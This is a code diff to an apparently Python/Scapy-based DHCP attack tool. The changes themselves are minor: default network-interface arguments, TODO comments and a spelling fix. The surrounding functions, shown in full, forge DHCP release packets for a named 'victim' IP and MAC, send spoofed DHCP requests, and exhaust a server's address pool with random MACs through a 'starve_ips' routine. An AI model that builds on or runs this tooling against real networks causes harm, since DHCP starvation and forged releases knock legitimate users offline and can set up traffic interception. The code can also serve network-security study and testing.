@@ -26,7 +26,10 @@ class MESSAGETYPE:
 class DHCP_ATTS:
     MSGTYPE = MESSAGETYPE()
 
-
+"""
+TODO make mac templates
+TODO verbose flag
+"""
 
 
 def random_transaction_id():
@@ -49,7 +52,7 @@ def mac_to_binary(regular_mac : str):
     return binascii.unhexlify(regular_mac)
 
 
-def dhcp_release(server_mac : str ,server_ip : str, victim_ip : str , victim_mac : str, victim_transaction_id : hex, interface : str):
+def dhcp_release(server_mac : str ,server_ip : str, victim_ip : str , victim_mac : str, victim_transaction_id : hex, interface : str = conf.iface):
     """
     sends a DHCP release with the source and dest being the args through the arg interface
     """
@@ -70,7 +73,7 @@ def dhcp_release(server_mac : str ,server_ip : str, victim_ip : str , victim_mac
         
     sendp(releaseMyIp, iface=interface)
 
-def dhcp_request( victim_ip : str, device_mac : str, victim_transaction_id : hex, server_ip : str, interface : str):
+def dhcp_request( victim_ip : str, device_mac : str, victim_transaction_id : hex, server_ip : str, interface : str = conf.iface):
     """
     sends a DHCP request with the source being the args through the arg interface
     """
@@ -86,7 +89,7 @@ def dhcp_request( victim_ip : str, device_mac : str, victim_transaction_id : hex
         print(f"{function_name} : sending dhcp request for {victim_ip} to {server_ip}, via {interface}")
     sendp(request_packet, iface=interface)
 
-def dhcp_discover(src_mac : str, interface : str):
+def dhcp_discover(src_mac : str, interface : str = conf.iface):
     """
     sends a DHCP discover with the source being the args through the arg interface
     """
@@ -99,9 +102,8 @@ def dhcp_discover(src_mac : str, interface : str):
                         / DHCP(options=dhcp_options)
     sendp(discover_packet, iface=interface)   
 
-def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str, result_list = None):
+def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str = conf.iface , result_list = None):
     """
-    TODO add ether dst to sniff filter
     Gets a MAC and server IP
     tries to Capture DHCP responses for the provided MAC
     """
@@ -120,8 +122,7 @@ def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str, res
     #see if theres a dhcp response for me
     for packet in res:
         if(is_for_my_mac(dest_mac, packet) and is_dhcp_offer(packet)):
-            if(result_list is not None):
-                result_list[0] = packet
+            result_list[0] = packet
             if (args.debug):
                 print(f"{function_name} returning {packet}")
             return packet
@@ -204,11 +205,11 @@ def is_bootp_reply(packet)->bool:
 
 
 
-def starve_ips( server_ip : str, server_mac : str , interface : str,ips_to_starve : int = 5)->List[Tuple[str, str, str]]:
+def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,ips_to_starve : int = 5)->List[Tuple[str, str, str]]:
     """
     TODO check if dhcp request if acked
     TODO option to keep alive ip's while starving
-    TODO warn about NACKs
+    TODO warn about NAKs
     starves ips at the given interface and returns a list of (ip, mac, interface) that are occupied in
     this starvation session
     """
@@ -232,7 +233,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str,ips_to_starv
 
         offer = [None]
         
-        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface,offer])
+        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface ,offer])
         sniff_thread.start()
         
         time.sleep(0.2)
@@ -259,7 +260,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str,ips_to_starv
     return occupied_ips
 
 
-def sendp_icmp(src_ip : str, src_mac : str, dst_ip : str, dst_mac : str, interface : str):
+def sendp_icmp(src_ip : str, src_mac : str, dst_ip : str, dst_mac : str, interface : str = conf.iface):
     
     function_name = inspect.currentframe().f_code.co_name
     
